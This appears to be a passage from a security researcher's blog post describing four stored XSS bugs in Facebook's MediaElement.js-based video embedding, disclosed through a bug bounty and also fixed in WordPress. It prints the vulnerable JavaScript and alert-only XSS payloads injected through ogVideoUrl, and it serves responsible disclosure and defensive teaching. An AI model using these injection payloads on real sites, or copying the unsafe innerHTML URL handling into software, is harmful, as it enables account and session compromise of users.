<p>IfÂ ogVideoType is &#8220;iframe&#8221; or &#8220;swf player&#8221; then FB loads an external iframe and doesn&#8217;t handle the playing of the video. Otherwise, FB was using <a href="http://www.mediaelementjs.com/">MediaElement.js</a> to handle the loading of the video directly on facebook.com. I already reported and <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">disclosed vulnerabilities</a>Â on the Flash component of ME.js on both Facebook and WordPress.</p>
<p>&nbsp;</p>
<h2>1. Stored XSS using FlashMediaElement.swf</h2>
<p>MediaElements.js has multiple ways of playing a video depending on ogVideoType.</p>
<p>If ogVideoType is &#8220;video/flv&#8221; (flash video), Facebook loads the Flash file FlashMediaElement.swf on facebook.comÂ  (using an &lt;embed&gt; tag) and passes the ogVideoUrl to FlashME.swf to play the video. FlashME.swf then sends logs information to facebook.com (using Flash-to-javascript) about events like &#8220;video played&#8221; or &#8220;video ended&#8221;.Â FlashME.swf handled correctly the Flash-to-javascript communication, in particular <strong>\</strong> was properly escaped to <strong>\\</strong> to avoid XSS.</p>
<p>However, the javascript code sent was :</p>
<pre><code>setTimeout('log("[VIDEO_URL]")', 0)</code></pre>
<blockquote><p>In javascript setTimeout is similar to eval, it will transform a string into instructions, making it very dangerous</p></blockquote>
<p>[VIDEO_URL] is controlled by the attacker, it&#8217;s the value of ogVideoUrl. If it contains <strong>&#8220;</strong> for example <pre><code>http://evil.com/video.flv?"[payload]</code></pre> Flash will send the following instruction to javascript:</p>
<pre><code>setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre>
<p>As you can see, the <strong>&#8220;</strong> in <strong>video.flv?\&#8221;payload</strong> is properly escaped so the attacker cannot escape from the setTimeout function.</p>
<p>However, when javascript executes the setTimeout function, it will execute the following javascript instruction :</p>
<pre><code>log("http://evil.com/video.flv?"[payload]")</code></pre>
<p>And this time <strong>&#8220;</strong> is not escaped any more and the attacker can inject XSS!</p>
<p>Now the question is whether Facebook escapes ogVideoUrl before passing it to FlashME.swf.</p>
<p>First, Facebook javascript sends a XHR request to Facebook server to get the value of ogVideoType and ogVideoUrl. The value ofÂ ogVideoUrl is correctly encoded but it can contain any special character like <pre><code>https://evil.com?"'&lt;\</code></pre></p>
<p>Then, before being sent to Flash, ogVideoUrl was transformed like this :</p>
<pre><code>function absolutizeUrl(<span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>) {<br/>
var tempDiv = document.createElement('div');<br/>
tempDiv.innerHTML = '&lt;a href="' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>.toString().split('"').join('&amp;quot;') + '"&gt;x&lt;/a&gt;';<br/>
return tempDiv.firstChild.href;<br/>
}</p>
<p>flashDiv.innerHTML ='&lt;embed src="FlashME.swf?videoFile=' +Â <span class="objectBox objectBox-text " role="presentation">encodeURI(absolutizeUrl(ogVideoUrl )) +'</span>" type="application/x-shockwave-flash"&gt;';</p>
<p></code></pre>
<p>The result ofÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl) is URL encoded before being sent to Flash but when Flash will receive the data it will automatically URL decode it once, so we can ignore theÂ encodeURI instruction.</span></p>
<p><span class="objectBox objectBox-text " role="presentation">absolutizeUrl t</span>ransforms relative URL to absolute URL with the current protocol and domain of the javascript context (and if anÂ absolute URL is provided, it returns it almost unchanged). This seems &#8220;hacky&#8221; but it seems secure enough and simple because we let the browser do the hard work. But it&#8217;s not simple when it comes to special character encoding!</p>
<p>When initially analyzing this code, I was using Firefox, because it had great extensions like Hackbar, Tamper Data and&#8230; Firebug!</p>
<p>In Firefox, if you tryÂ <pre><code>absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> it will returnÂ <pre><code>http://evil.com/video.flv#%22payload</code></pre> so I was stuck because in Facebook the javascript instruction sent by Flash would beÂ <pre><code>setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);</code></pre> which will lead toÂ <pre><code>log("http://evil.com/video.flv?%22[payload]")</code></pre> which is NOT an XSS.</p>
<p>&nbsp;</p>
<p>And then I tried on Chrome and <pre><code>absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> returnedÂ <pre><code>http://evil.com/video.flv#"payload</code></pre> and <strong>\o/ YEAH!!!!!</strong></p>
<p>Now Flash sends <pre><code>setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre> to Facebook javascript and which will lead toÂ <pre><code>log("http://evil.com/video.flv?"[payload]")</code></pre></p>
<p>So if ogVideoUrl is set toÂ <pre><code>http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"</code></pre> then Facebook will executeÂ <pre><code>log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"") </code></pre> and will display a nice little alert box saying &#8220;facebook.com XSSed!&#8221; ðŸ™‚</p>
<blockquote><p>The reason of this is that when a browser parses a URL, it will encode special characters differently depending on the browser:</p>
<ul>
<li>Firefox will URLencode any occurence of <strong>&#8220;</strong> in the url</li>
<li>Chrome, up to version 64, would URLencode <strong>&#8220;</strong> EXCEPT in the hash part (= fragment) of the URL (note: in the latest version 65 of Chrome, this behaviour changed and now Chrome behaves like Firefox and will URLencode &#8221; even in the hash part</li>
<li>IE and Edge will NOT URLencode <strong>&#8220;</strong> in the hash part NOR the search part (= query) of the URL</li>
<li>Safari willÂ NOT URLencode <strong>&#8220;</strong> in the hash part</li>
</ul>
<p>As you can see it&#8217;s not great to let the browser decide how to encode special characters in URLs in your javascript code!</p></blockquote>
<p>I reported the vulnerability right away to Facebook and they replied the next day and told me they modified the Flash file so that it doesn&#8217;t useÂ setTimeout any more,Â  the Flash would now sendÂ <pre><code>log("http://evil.com/video.flv?\"payload")</code></pre> and as you can see <strong>&#8220;</strong> is properly escaped to <strong>\&#8221;</strong> and there is no XSS any more.</p>
<p>&nbsp;</p>
<h2>2. Stored XSS without Flash</h2>
<p>The previous XSS required Flash so I checked if I could find another payload without Flash.</p>
<p>If ogVideoType was &#8220;video/vimeo&#8221;, the following code would execute</p>
<pre><code><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>+ '?api=1"&gt;&lt;/iframe&gt;';</p>
<p></code></pre>
<p>As you can seeÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogURL) is not urlencoded before being injected toÂ playerDiv.innerHTML, so with ogVideoUrl set to <pre><code>http://evil.com/#" onload="alert(document.domain)"</code></pre>Â playerDiv.innerHTML would beÂ <pre><code>&lt;iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"&gt;&lt;/iframe&gt; </code></pre></span></p>
<p><span class="objectBox objectBox-text " role="presentation">which is again an XSS on facebook.com!</span></p>
<p>&nbsp;</p>
<p>I reported this on the same day the previous XSS was fixed and Facebook fixed it again in 1 day like this :</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code></span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">.split('"').join('&amp;quot;')</span>Â + '?api=1"&gt;&lt;/iframe&gt;'</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Here is a video of this XSS in action :</p>
<div class="jetpack-video-wrapper"><iframe title="Facebook XSS" width="1170" height="658" src="https://www.youtube.com/embed/Q9bsKjUd1hM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>The next day, I found another vulnerable endpoint: when ogVideoType was something unknown, like &#8220;video/nothing&#8221;, Facebook would display an error message with a link to <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span> like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code></span>errorDiv.innerHTMLÂ = '&lt;a href="' +<span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl )</span> + '"&gt;'<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>So with the <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>payloadÂ <span class="objectBox objectBox-text " role="presentation"><pre><code></span>/#"&gt;&lt;img/src="xxx"onerror="alert(document.domain)<span class="objectBox objectBox-text " role="presentation"></code></pre></span>Â errorDiv.innerHTML would beÂ <span class="objectBox objectBox-text " role="presentation"><pre><code></span>&lt;a href="/#"&gt;&lt;img src="xxx" onerror="alert(document.domain)"&gt;<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>&nbsp;</p>
<p>I reported it to Facebook and, funny enough, Neil from Facebook WhiteHat told me he was planning to check this code the next day!</p>
<p>&nbsp;</p>
<h2>3. Oh, and one more thing&#8230;</h2>
<p>Another possible ogVideoType was &#8220;silverlight&#8221;. <a href="https://www.microsoft.com/silverlight/">Silverlight</a>Â is a browser plugin by Microsoft and is to Flash what VBscript was to javascript.</p>
<p>The silverlight file hosted on Facebook (silverlightmediaelement.xap) was loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code></span></p>
<p>params = ["file=" + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">, "id=playerID"</span>];</p>
<p>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="' + params.join(',').split('"').join('&amp;quot;') + '" /&gt;&lt;/object&gt;';</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>silverlightmediaelement.xapÂ would then send log information to Facebook javascript a little bit like the Flash file did, but this time it didn&#8217;t contain <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span> but only the player id, which is another parameter sent inÂ initParams and defined by Facebook. Silverlight would call the javascript function <strong>[id]_init()</strong>Â where [id] is &#8220;playerID&#8221;.</p>
<p>InÂ silverlight, parameters are not separated by <strong>&amp;</strong>Â like in urls or in Flash but by <strong>,</strong></p>
<p>If <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>contains a <strong>,</strong> then every thing after this comma will be considered as another parameter by silverlight, which means that using the payloadÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code></span>/#,id=alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span> then silverlight be loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code></span>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="file=/#,id=alert(document.domain)&amp;,id=playerID" /&gt;&lt;/object&gt;'; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will only take into account the first occurence of id and it will set its value toÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code></span>alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will then call the following javascript :Â  <span class="objectBox objectBox-text " role="presentation"><pre><code></span>alert(document.domain)&amp;_init() <span class="objectBox objectBox-text " role="presentation"></code></pre></span> which means XSS again!</p>
<p>&nbsp;</p>
<p>I reported it the same day and Neal replied that they would remove all the MediaElement component and replace it with a new way of handling external videos!</p>
<p>&nbsp;</p>
<h2>What about WordPress ?</h2>
<p>All this vulnerable code wasn&#8217;t developed by Facebook, they used an open source libraryÂ <a href="http://www.mediaelementjs.com/">MediaElementjs</a>Â which was (and still is) a popular module to embed video in a webpage, especially because they had a Flash fallback for older browsers. In particular, WordPress uses this module by default when handling <a href="https://codex.wordpress.org/Shortcode_API">shortcodes</a>. The vulnerabilities were also present in WordPress and allowed stored XSS in WordPress comments or in WordPress articles written by authors (in WordPress, the Author role isn&#8217;t allowed to execute javascript).</p>
<p>I reported the vulnerabilities to WordPress to which I already reported <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">another vulnerability</a>Â monthes before. They informed MediaElementjs team about this and told me they were working on a fix. On February 2018 they finally released the fix for all the XSS related to MediaElementjs.</p>
<p>&nbsp;</p>
<h2>Conclusion</h2>
<p>I learned a lot and had a lot of fun finding these vulnerabilities. I hope you also enjoy it!</p>
<p>Here is some advices :</p>
<blockquote><p>Open Graph (and alternatives like json-ld) is a great way to display rich external content on a website, but you should be careful about it (think SSRF, XSS and Clickjacking)</p>
<p>Don&#8217;t let the browser parse URL for you in your javascript code, each browser handles it his own way and a browser can change its behavior anytime (like Chrome 64 -&gt; 65). Use white-list regex instead.</p>
<p>Complex, dynamic XSSes that use XHR, DOM mutations, and external content will NOT be detected by automatic tools (for now). So even the most secure, high profile website can be vulnerable. Code review and debugging are the way to go for these!</p>
<p>Don&#8217;t be afraid of large, minified, dynamic javascript source code. If you spot some potentially dangerous features on a website, you&#8217;re free to check how it is implemented!</p>
<p>Facebook WhiteHat is a great Bug Bounty program! Thanks Neal and all the team ðŸ™‚</p></blockquote>
<p>Thanks for reading, and feel free to comment if something isn&#8217;t clear.</p>
<p>&nbsp;</p>
<p>Happy hunting !</p>
<div id="xsbf-after-content" class="after-content">

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
</div><!-- .after-content -->		
		

	<footer class="entry-meta">

					 
							<span class="cat-links"><span class="glyphicon glyphicon-tag"></span>&nbsp;
				<a href="/category/uncategorized/" rel="category tag">Uncategorized</a>				</span>
					
		<span class="tags-links"><span class="glyphicon glyphicon-tags"></span> &nbsp;<a href="/tag/facebook/" rel="tag">Facebook</a>, <a href="/tag/xss/" rel="tag">XSS</a></span> 

				
	</footer><!-- .entry-meta -->



		
		
	</div><!-- .entry-content -->

</article><!-- #post-## -->

			
<div id="comments" class="comments-area">

	
			<h2 class="comments-title">
			2 comments on &ldquo;<span>Stored XSS on Facebook</span>&rdquo;		</h2>

		
		<ul class="comment-list">
			
	<li id="comment-464" class="comment even thread-even depth-1">
		<article id="div-comment-464" class="comment-body">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='https://secure.gravatar.com/avatar/1309cc53e3413c79b54d698361f1076d?s=60&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1309cc53e3413c79b54d698361f1076d?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 thumbnail photo' height='60' width='60' loading='lazy'/>					<cite class="fn"><a href='http://none-' rel='external nofollow ugc' class='url'>default_user</a></cite> <span class="says">says:</span>				</div><!-- .comment-author -->

				<div class="comment-metadata">
					<a href="/2018/03/stored-xss-on-facebook/#comment-464">
						<time datetime="2018-03-18T21:36:11+00:00">
							March 18, 2018 at 9:36 pm						</time>
					</a>
									</div><!-- .comment-metadata -->

							</footer><!-- .comment-meta -->

			<div class="comment-content">
				<p>Firstly , WOW, like what the heck man who are you :p . You don&#8217;t happen to be  a js developer by any chance right ?</p>
			</div><!-- .comment-content -->

					</article><!-- .comment-body -->

	</li><!-- #comment-## -->

	<li id="comment-799" class="comment odd alt thread-odd thread-alt depth-1">
		<article id="div-comment-799" class="comment-body">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='https://secure.gravatar.com/avatar/8c7af768876dd6cf85a41a7661d83556?s=60&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8c7af768876dd6cf85a41a7661d83556?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 thumbnail photo' height='60' width='60' loading='lazy'/>					<cite class="fn">Florian V</cite> <span class="says">says:</span>				</div><!-- .comment-author -->

				<div class="comment-metadata">
					<a href="/2018/03/stored-xss-on-facebook/#comment-799">
						<time datetime="2018-07-13T12:22:29+00:00">
							July 13, 2018 at 12:22 pm						</time>
					</a>
									</div><!-- .comment-metadata -->

							</footer><!-- .comment-meta -->

			<div class="comment-content">
				<p>Amazing and inspiring, thank you ! ðŸ™‚</p>
			</div><!-- .comment-content -->

					</article><!-- .comment-body -->

	</li><!-- #comment-## -->
		</ul><!-- .comment-list -->

		
	
			<p class="no-comments">Comments are closed.</p>
	
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->

	<div id="secondary" class="widget-area col-md-4" role="complementary">
				<aside id="search-2" class="widget clearfix widget_search"><form role="search" method="get" class="search-form form-inline" action="/">
<div class="form-group">
	<label>
		<span class="screen-reader-text sr-only">Search for:</span>
		<input type="search" class="search-field form-control" placeholder="Search &hellip;" value="" name="s">
	</label>
	<input type="submit" class="search-submit btn btn-primary" value="Search">
</div><!-- .form-group -->
</form>
</aside>
		<aside id="recent-posts-2" class="widget clearfix widget_recent_entries">
		<h2 class="widget-title">Recent Posts</h2>
		<ul>
											<li>
					<a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/">DOM XSS in Gmail with a little help from Chrome</a>
									</li>
											<li>
					<a href="/2018/07/into-the-borg-ssrf-inside-google-production-network/">Into the Borg &#8211; SSRF inside Google production network</a>
									</li>
											<li>
					<a href="/2018/03/stored-xss-on-facebook/" aria-current="page">Stored XSS on Facebook</a>
									</li>
											<li>
					<a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">FlashME! &#8211; WordPress vulnerability disclosure [CVE-2016-9263]</a>
									</li>
											<li>
					<a href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]</a>
									</li>
					</ul>

		</aside><aside id="recent-comments-2" class="widget clearfix widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='' rel='external nofollow ugc' class='url'>Engue Gillier</a></span> on <a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064">DOM XSS in Gmail with a little help from Chrome</a></li><li class="recentcomments"><span class="comment-author-link">vahhitiu</span> on <a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020">DOM XSS in Gmail with a little help from Chrome</a></li><li class="recentcomments"><span class="comment-author-link">Just a nOob</span> on <a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910">DOM XSS in Gmail with a little help from Chrome</a></li><li class="recentcomments"><span class="comment-author-link">Nani</span> on <a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019">DOM XSS in Gmail with a little help from Chrome</a></li><li class="recentcomments"><span class="comment-author-link"><a href='' rel='external nofollow ugc' class='url'>Engue Gillier</a></span> on <a href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513">DOM XSS in Gmail with a little help from Chrome</a></li></ul></aside>	</div><!-- #secondary -->
</div><!-- .row -->
</div><!-- .container -->

	</div><!-- #content -->

	
	<div id="sidebar-pagebottom" class="sidebar-pagebottom">
				<aside id="block-4" class="widget widget_block clearfix"><div class="container">
<div class="wp-container-1 wp-block-buttons"></div>
</div><!-- container --></aside>	</div><!-- .sidebar-pagebottom -->


		<footer id="colophon" class="site-footer" role="contentinfo">
		
	

	
	
		  
	<div class="after-footer">
	<div class="container">

					<div class="footer-nav-menu pull-left">
			<nav id="footer-navigation" class="secondary-navigation" role="navigation">
				<h1 class="menu-toggle sr-only">Footer Menu</h1>
				
		<div class="sample-menu-footer-container">
		<ul id="sample-menu-footer" class="list-inline dividers">
		<li id="menu-item-sample-1" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-sample-1"><a class="smoothscroll" title="Back to top of page" href="#page"><span class="fa fa-angle-up"></span> Top</a></li><li id="menu-item-sample-2" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-sample-2"><a title="Home" href="">Home</a></li>
		</ul>
		</div>			</nav>
			</div><!-- .footer-nav-menu -->
		
					<div id="site-credits" class="site-credits pull-right">
			<span class="credits-copyright">&copy; 2026 <a href="/" rel="home">OpnSec</a>. </span><span class="credits-theme">Theme by <a href="http://xtremelysocial.com/wordpress/flat/" rel="profile" target="_blank">XtremelySocial</a>.</span>			</div><!-- .site-credits -->
		
	</div><!-- .container -->
	</div><!-- .after-footer -->
			
	</footer><!-- #colophon -->

</div><!-- #page -->

<style>.wp-container-1{display:flex;gap:.5em;flex-wrap:wrap;align-items:center}.wp-container-1>*{margin:0}</style>
<link rel='stylesheet' id='hljstheme-css' href='//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/agate.min.css?ver=0.6.2' type='text/css' media='all'/>
<script type='text/javascript' src='/wp-content/themes/flat-bootstrap/bootstrap/js/bootstrap.min.js?ver=3.3.6' id='bootstrap-js'></script>
<script type='text/javascript' src='/wp-content/themes/flat-bootstrap/js/theme.js?ver=20160303' id='theme-js'></script>
<script type='text/javascript' src='//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js?ver=0.6.2' id='hljs-js'></script>
<script type='text/javascript' src='/wp-content/plugins/jetpack/modules/theme-tools/responsive-videos/responsive-videos.min.js?ver=1.3' id='jetpack-responsive-videos-min-script-js'></script>
<script type='text/javascript' id='twitter-wjs-js-extra'>//<![CDATA[
window.twttr=(function(w){t=w.twttr||{};t._e=[];t.ready=function(f){t._e.push(f);};return t;}(window));
//]]></script>
<script type="text/javascript" id="twitter-wjs" async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
    <style>code.hljs{}</style>
    <script type="text/javascript">(function($,window){var init_fn_flag=false;var init_fn=(function(){if(init_fn_flag)return;init_fn_flag=true;hljs.configure({"tabReplace":"    ","useBR":true});$('pre code').each(function(i,block){hljs.highlightBlock(block);});});$(document).ready(init_fn);$(window).on("load",init_fn);})(jQuery,window);</script>
<script type='text/javascript' src='https://stats.wp.com/e-202608.js' async='async' defer='defer'></script>
<script type='text/javascript'>_stq=window._stq||[];_stq.push(['view',{v:'ext',j:'1:8.5.3',blog:'250189475',post:'242',tz:'0',srv:'opnsec.com'}]);_stq.push(['clickTrackerInit','250189475','242']);</script>

</body>
</html>